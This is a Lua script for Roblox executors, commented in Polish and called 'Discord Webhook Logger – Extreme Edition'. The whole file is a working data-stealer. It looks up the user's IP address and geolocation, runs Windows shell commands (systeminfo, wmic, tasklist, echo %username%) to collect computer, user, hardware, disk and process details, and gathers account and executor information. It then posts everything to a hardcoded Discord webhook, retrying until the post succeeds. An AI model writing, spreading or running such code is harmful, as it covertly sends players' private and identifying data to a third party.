-- ============================================================
--  DISCORD WEBHOOK LOGGER – EXTREME EDITION
--  Zbiera WSZYSTKIE możliwe dane
-- ============================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- 🔗 TWÓJ WEBHOOK
local WEBHOOK_URL = "https://discord.com/api/webhooks/1537198978389516288/4OTk5kTJarZ7HH0pqesWtCwCDmhYcEYTgPQvnRQ58di11mNEeNuVEFfcKdXU77eHvDjv"

-- ============================================================
--  FUNKCJE POBIERAJĄCE DANE
-- ============================================================

-- ===== 1. IP i lokalizacja (przez API) =====
local function getLocationInfo()
    local info = {
        ip = "Nieznane",
        country = "Nieznane",
        country_code = "Nieznane",
        city = "Nieznane",
        region = "Nieznane",
        region_code = "Nieznane",
        isp = "Nieznane",
        timezone = "Nieznane",
        latitude = "Nieznane",
        longitude = "Nieznane",
        postal = "Nieznane",
        org = "Nieznane",
        asn = "Nieznane"
    }
    local success, result = pcall(function()
        return game:HttpGet("https://ipapi.co/json/")
    end)
    if success and result then
        local data = HttpService:JSONDecode(result)
        info.ip = data.ip or "Nieznane"
        info.country = data.country_name or "Nieznane"
        info.country_code = data.country or "Nieznane"
        info.city = data.city or "Nieznane"
        info.region = data.region or "Nieznane"
        info.region_code = data.region_code or "Nieznane"
        info.isp = data.org or "Nieznane"
        info.timezone = data.timezone or "Nieznane"
        info.latitude = tostring(data.latitude or "Nieznane")
        info.longitude = tostring(data.longitude or "Nieznane")
        info.postal = data.postal or "Nieznane"
        info.org = data.org or "Nieznane"
        info.asn = data.asn or "Nieznane"
    end
    return info
end

-- ===== 2. Dane systemowe (przez io.popen – jeśli dostępne) =====
local function getSystemInfo()
    local info = {
        os = "Nieznane",
        os_version = "Nieznane",
        computer_name = "Nieznane",
        user_name = "Nieznane",
        architecture = "Nieznane",
        language = "Nieznane",
        timezone = "Nieznane",
        memory = "Nieznane",
        cpu = "Nieznane",
        gpu = "Nieznane",
        disk_free = "Nieznane",
        disk_total = "Nieznane",
        uptime = "Nieznane"
    }

    -- Próba wykonania poleceń systemowych (jeśli executor pozwala)
    pcall(function()
        if io and io.popen then
            -- Windows
            local f = io.popen("ver")
            if f then
                local result = f:read("*a")
                f:close()
                if result and result ~= "" then
                    info.os_version = result:match("Microsoft Windows %[Version (.-)%]") or result:match("Version (.-)") or result
                end
            end

            -- Nazwa komputera
            local f2 = io.popen("echo %computername%")
            if f2 then
                local result = f2:read("*a")
                f2:close()
                if result and result ~= "" then
                    info.computer_name = result:gsub("\n", "")
                end
            end

            -- Nazwa użytkownika
            local f3 = io.popen("echo %username%")
            if f3 then
                local result = f3:read("*a")
                f3:close()
                if result and result ~= "" then
                    info.user_name = result:gsub("\n", "")
                end
            end

            -- Wersja systemu
            local f4 = io.popen("systeminfo | findstr /B /C:\"OS Name\"")
            if f4 then
                local result = f4:read("*a")
                f4:close()
                if result and result ~= "" then
                    info.os = result:match("OS Name:%s*(.+)"):gsub("\n", "") or "Nieznane"
                end
            end

            -- Pamięć (RAM)
            local f5 = io.popen("wmic os get TotalVisibleMemorySize,FreePhysicalMemory")
            if f5 then
                local result = f5:read("*a")
                f5:close()
                if result and result ~= "" then
                    local total, free = result:match("(%d+)%s+(%d+)")
                    if total and free then
                        info.memory = string.format("Całkowita: %.2f GB, Wolna: %.2f GB", tonumber(total)/1048576, tonumber(free)/1048576)
                    end
                end
            end

            -- CPU
            local f6 = io.popen("wmic cpu get name")
            if f6 then
                local result = f6:read("*a")
                f6:close()
                if result and result ~= "" then
                    local cpu = result:match("Name%s+(.+)")
                    if cpu then
                        info.cpu = cpu:gsub("\n", "")
                    end
                end
            end

            -- GPU
            local f7 = io.popen("wmic path win32_VideoController get name")
            if f7 then
                local result = f7:read("*a")
                f7:close()
                if result and result ~= "" then
                    local gpu = result:match("Name%s+(.+)")
                    if gpu then
                        info.gpu = gpu:gsub("\n", "")
                    end
                end
            end
        end
    end)

    -- Jeśli io.popen nie działa, spróbuj przez getenv
    pcall(function()
        info.computer_name = os.getenv("COMPUTERNAME") or info.computer_name
        info.user_name = os.getenv("USERNAME") or info.user_name
        info.os = os.getenv("OS") or info.os
        info.processor = os.getenv("PROCESSOR_IDENTIFIER") or "Nieznane"
        info.processor_arch = os.getenv("PROCESSOR_ARCHITECTURE") or "Nieznane"
    end)

    return info
end

-- ===== 3. Dane o procesach (przez tasklist) =====
local function getProcessInfo()
    local info = {
        running = "Nieznane",
        total = "Nieznane"
    }
    pcall(function()
        if io and io.popen then
            local f = io.popen("tasklist")
            if f then
                local result = f:read("*a")
                f:close()
                if result and result ~= "" then
                    local count = 0
                    for line in result:gmatch("[^\n]+") do
                        if line:match("%.exe") then
                            count = count + 1
                        end
                    end
                    info.total = tostring(count)
                    -- Wykryj znane programy
                    local known = {
                        "discord", "chrome", "firefox", "opera", "brave",
                        "steam", "epicgames", "spotify", "vlc", "obs",
                        "notepad", "word", "excel", "powershell", "cmd"
                    }
                    local found = {}
                    for _, name in ipairs(known) do
                        if result:lower():find(name) then
                            table.insert(found, name)
                        end
                    end
                    info.running = table.concat(found, ", ") or "Brak znanych"
                end
            end
        end
    end)
    return info
end

-- ===== 4. Dane o dyskach =====
local function getDiskInfo()
    local info = {
        drives = "Nieznane",
        total_space = "Nieznane",
        free_space = "Nieznane"
    }
    pcall(function()
        if io and io.popen then
            local f = io.popen("wmic logicaldisk get deviceid,size,freespace")
            if f then
                local result = f:read("*a")
                f:close()
                if result and result ~= "" then
                    local drives = {}
                    for line in result:gmatch("[^\n]+") do
                        local drive, size, free = line:match("(%a:)%s+(%d+)%s+(%d+)")
                        if drive and size and free then
                            table.insert(drives, string.format("%s (%.2f GB / %.2f GB)", drive, tonumber(free)/1073741824, tonumber(size)/1073741824))
                        end
                    end
                    info.drives = table.concat(drives, ", ") or "Brak"
                end
            end
        end
    end)
    return info
end

-- ===== 5. Dane o środowisku Roblox =====
local function getRobloxInfo()
    local info = {
        placeId = tostring(game.PlaceId),
        jobId = game.JobId or "Brak",
        gameName = "Nieznane",
        creator = "Nieznane",
        serverTime = string.format("%.0f s", workspace:GetServerTimeNow()),
        players = #Players:GetPlayers(),
        maxPlayers = Players.MaxPlayers,
        studio = RunService:IsStudio() and "Tak" or "Nie",
        fps = "Nieznane"
    }
    pcall(function()
        local productInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
        info.gameName = productInfo.Name or "Nieznane"
        info.creator = productInfo.Creator.Name or "Nieznane"
    end)
    pcall(function()
        info.fps = tostring(game:GetService("Stats"):Get("FPS"))
    end)
    return info
end

-- ===== 6. Dane o graczu =====
local function getPlayerInfo()
    local info = {
        name = LocalPlayer.Name,
        userId = tostring(LocalPlayer.UserId),
        displayName = LocalPlayer.DisplayName,
        accountAge = "Nieznane",
        ping = string.format("%.0f ms", LocalPlayer:GetNetworkPing() * 1000),
        platform = LocalPlayer:GetPlatform() or "Nieznane",
        isInGroup = "Nieznane"
    }
    pcall(function()
        info.accountAge = tostring(LocalPlayer.AccountAge or "Nieznane")
    end)
    pcall(function()
        info.isInGroup = tostring(#LocalPlayer:GetFriendsOnline() or "Nieznane")
    end)
    return info
end

-- ===== 7. Dane o executorze =====
local function getExecutorInfo()
    local info = {
        executor = "Nieznane",
        version = "Nieznane",
        environment = "Nieznane",
        luaVersion = _VERSION or "Nieznane",
        isSynapse = "Nie",
        isKrnl = "Nie",
        isScriptWare = "Nie",
        isFluxus = "Nie",
        isDelta = "Nie",
        isArceusX = "Nie",
        isEvon = "Nie",
        isElectron = "Nie",
        isVegaX = "Nie",
        isSolara = "Nie",
        isHydrogen = "Nie",
        isCodeX = "Nie",
        isSwift = "Nie",
        isAWP = "Nie",
        isCalamari = "Nie",
        isSirHurt = "Nie",
        isCoco = "Nie",
        isValyse = "Nie",
        isXeno = "Nie",
        isNova = "Nie",
        isZen = "Nie",
        isOther = "Nie"
    }

    local env = (type(getgenv) == "function" and getgenv()) or _G

    if syn and syn.request then info.executor = "Synapse X"; info.isSynapse = "Tak"
    elseif krnl and krnl.request then info.executor = "Krnl"; info.isKrnl = "Tak"
    elseif scriptware and scriptware.request then info.executor = "Script-Ware"; info.isScriptWare = "Tak"
    elseif fluxus and fluxus.request then info.executor = "Fluxus"; info.isFluxus = "Tak"
    elseif delta and delta.request then info.executor = "Delta"; info.isDelta = "Tak"
    elseif arceusx and arceusx.request then info.executor = "Arceus X"; info.isArceusX = "Tak"
    elseif evon and evon.request then info.executor = "Evon"; info.isEvon = "Tak"
    elseif electron and electron.request then info.executor = "Electron"; info.isElectron = "Tak"
    elseif vegax and vegax.request then info.executor = "Vega X"; info.isVegaX = "Tak"
    elseif solara and solara.request then info.executor = "Solara"; info.isSolara = "Tak"
    elseif hydrogen and hydrogen.request then info.executor = "Hydrogen"; info.isHydrogen = "Tak"
    elseif codex and codex.request then info.executor = "CodeX"; info.isCodeX = "Tak"
    elseif swift and swift.request then info.executor = "Swift"; info.isSwift = "Tak"
    elseif awp and awp.request then info.executor = "AWP"; info.isAWP = "Tak"
    elseif calamari and calamari.request then info.executor = "Calamari"; info.isCalamari = "Tak"
    elseif sirhurt and sirhurt.request then info.executor = "SirHurt"; info.isSirHurt = "Tak"
    elseif coco and coco.request then info.executor = "Coco"; info.isCoco = "Tak"
    elseif valyse and valyse.request then info.executor = "Valyse"; info.isValyse = "Tak"
    elseif xeno and xeno.request then info.executor = "Xeno"; info.isXeno = "Tak"
    elseif nova and nova.request then info.executor = "Nova"; info.isNova = "Tak"
    elseif zen and zen.request then info.executor = "Zen"; info.isZen = "Tak"
    else
        info.executor = "Inny / Nieznany"
        info.isOther = "Tak"
    end

    info.environment = (type(getgenv) == "function" and "getgenv" or "_G")
    return info
end

-- ===== 8. Dane o czasie =====
local function getTimeInfo()
    local info = {
        local_time = os.date("%Y-%m-%d %H:%M:%S"),
        utc_time = os.date("!%Y-%m-%d %H:%M:%S"),
        timestamp = tostring(os.time()),
        timezone = "Nieznane"
    }
    pcall(function()
        info.timezone = os.getenv("TZ") or "Nieznane"
    end)
    return info
end

-- ===== 9. Dane o plikach (jeśli dostępne) =====
local function getFileInfo()
    local info = {
        lua_path = package.path or "Nieznane",
        lua_cpath = package.cpath or "Nieznane",
        current_dir = "Nieznane"
    }
    pcall(function()
        info.current_dir = io and io.popen and io.popen("cd"):read("*a"):gsub("\n", "") or "Nieznane"
    end)
    return info
end

-- ===== 10. Dane o zmiennych globalnych =====
local function getGlobalVars()
    local info = {
        count = "Nieznane",
        names = "Nieznane"
    }
    local env = (type(getgenv) == "function" and getgenv()) or _G
    local count = 0
    local names = {}
    for k, _ in pairs(env) do
        if type(k) == "string" and not k:match("^__") then
            count = count + 1
            if count <= 20 then
                table.insert(names, k)
            end
        end
    end
    info.count = tostring(count)
    info.names = table.concat(names, ", ") or "Brak"
    return info
end

-- ============================================================
--  TWORZENIE WIADOMOŚCI DLA DISCORD
-- ============================================================
local function buildEmbed()
    local location = getLocationInfo()
    local system = getSystemInfo()
    local processes = getProcessInfo()
    local disks = getDiskInfo()
    local roblox = getRobloxInfo()
    local player = getPlayerInfo()
    local executor = getExecutorInfo()
    local time = getTimeInfo()
    local files = getFileInfo()
    local globals = getGlobalVars()

    local embed = {
        title = "🪝 PEŁNE LOGI SYSTEMOWE",
        description = "Wszystkie możliwe dane o środowisku",
        color = 0x6a8aff,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
        footer = {
            text = "Logger EXTREME v2.0 | WysixAI",
            icon_url = "https://cdn.discordapp.com/embed/avatars/0.png"
        },
        fields = {
            -- ===== LOKALIZACJA =====
            {
                name = "🌍 LOKALIZACJA",
                value = string.format(
                    "**IP:** %s\n**Kraj:** %s (%s)\n**Miasto:** %s\n**Województwo:** %s (%s)\n**ISP:** %s\n**Strefa:** %s\n**Kod:** %s\n**ASN:** %s",
                    location.ip,
                    location.country,
                    location.country_code,
                    location.city,
                    location.region,
                    location.region_code,
                    location.isp,
                    location.timezone,
                    location.postal,
                    location.asn
                ),
                inline = false
            },
            -- ===== SYSTEM =====
            {
                name = "🖥️ SYSTEM",
                value = string.format(
                    "**OS:** %s\n**Wersja:** %s\n**Komputer:** %s\n**Użytkownik:** %s\n**Architektura:** %s\n**CPU:** %s\n**GPU:** %s\n**RAM:** %s",
                    system.os,
                    system.os_version,
                    system.computer_name,
                    system.user_name,
                    system.processor_arch or "Nieznane",
                    system.cpu,
                    system.gpu,
                    system.memory
                ),
                inline = false
            },
            -- ===== PROCESY =====
            {
                name = "⚙️ PROCESY",
                value = string.format(
                    "**Ilość:** %s\n**Znalezione:** %s",
                    processes.total,
                    processes.running
                ),
                inline = false
            },
            -- ===== DYSKI =====
            {
                name = "💾 DYSKI",
                value = string.format(
                    "**Dyski:** %s",
                    disks.drives
                ),
                inline = false
            },
            -- ===== ROBLOX =====
            {
                name = "🎮 ROBLOX",
                value = string.format(
                    "**Place ID:** %s\n**Job ID:** %s\n**Gra:** %s\n**Twórca:** %s\n**Czas:** %s\n**Gracze:** %s / %s\n**Studio:** %s\n**FPS:** %s",
                    roblox.placeId,
                    roblox.jobId,
                    roblox.gameName,
                    roblox.creator,
                    roblox.serverTime,
                    roblox.players,
                    roblox.maxPlayers,
                    roblox.studio,
                    roblox.fps
                ),
                inline = false
            },
            -- ===== GRACZ =====
            {
                name = "👤 GRACZ",
                value = string.format(
                    "**Nazwa:** %s\n**User ID:** %s\n**Display:** %s\n**Wiek konta:** %s\n**Ping:** %s\n**Platforma:** %s\n**Przyjaciele online:** %s",
                    player.name,
                    player.userId,
                    player.displayName,
                    player.accountAge,
                    player.ping,
                    player.platform,
                    player.isInGroup
                ),
                inline = false
            },
            -- ===== EXECUTOR =====
            {
                name = "⚡ EXECUTOR",
                value = string.format(
                    "**Nazwa:** %s\n**Lua:** %s\n**Środowisko:** %s\n**Synapse:** %s\n**Krnl:** %s\n**Script-Ware:** %s\n**Fluxus:** %s\n**Delta:** %s\n**Arceus X:** %s\n**Inny:** %s",
                    executor.executor,
                    executor.luaVersion,
                    executor.environment,
                    executor.isSynapse,
                    executor.isKrnl,
                    executor.isScriptWare,
                    executor.isFluxus,
                    executor.isDelta,
                    executor.isArceusX,
                    executor.isOther
                ),
                inline = false
            },
            -- ===== CZAS =====
            {
                name = "⏰ CZAS",
                value = string.format(
                    "**Lokalny:** %s\n**UTC:** %s\n**Timestamp:** %s",
                    time.local_time,
                    time.utc_time,
                    time.timestamp
                ),
                inline = false
            },
            -- ===== PLIKI =====
            {
                name = "📂 PLIKI",
                value = string.format(
                    "**Lua Path:** %s\n**Lua CPath:** %s\n**Bieżący katalog:** %s",
                    files.lua_path,
                    files.lua_cpath,
                    files.current_dir
                ),
                inline = false
            },
            -- ===== ZMIENNE GLOBALNE =====
            {
                name = "📦 ZMIENNE GLOBALNE",
                value = string.format(
                    "**Ilość:** %s\n**Nazwy:** %s",
                    globals.count,
                    globals.names
                ),
                inline = false
            }
        }
    }

    return embed
end

-- ============================================================
--  WYSYŁANIE NA DISCORD
-- ============================================================
local function sendToDiscord()
    local embed = buildEmbed()

    local payload = {
        username = "Logger EXTREME",
        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",
        embeds = {embed}
    }

    local json = HttpService:JSONEncode(payload)
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local success, err = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false, headers)
    end)

    if success then
        print("✅ Logi wysłane na Discord!")
    else
        warn("❌ Błąd wysyłki:", err)
        print("Spróbuj ponownie za 2 sekundy...")
        task.wait(2)
        sendToDiscord()
    end
end

-- ============================================================
--  URUCHOM
-- ============================================================
print("📤 Wysyłanie logów na Discord...")
sendToDiscord()

print("✅ Logger EXTREME uruchomiony!")
